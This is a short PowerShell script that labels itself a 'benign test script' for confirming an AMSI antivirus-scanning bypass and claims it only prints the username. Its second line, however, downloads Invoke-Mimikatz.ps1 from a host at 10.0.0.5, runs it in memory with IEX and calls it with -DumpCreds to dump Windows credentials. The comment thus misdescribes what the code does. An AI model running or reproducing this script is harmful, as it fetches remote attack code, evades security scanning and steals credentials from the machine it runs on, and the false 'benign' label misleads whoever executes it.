# Benign test script to test if the Bypass was seccussful(This will tyoe your username to terminal).
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
$username = $env:USERNAME
$evilString = "Invoke Mimikatz"
Write-Host "$username $evilString if you see this AMSI is Bypassed"
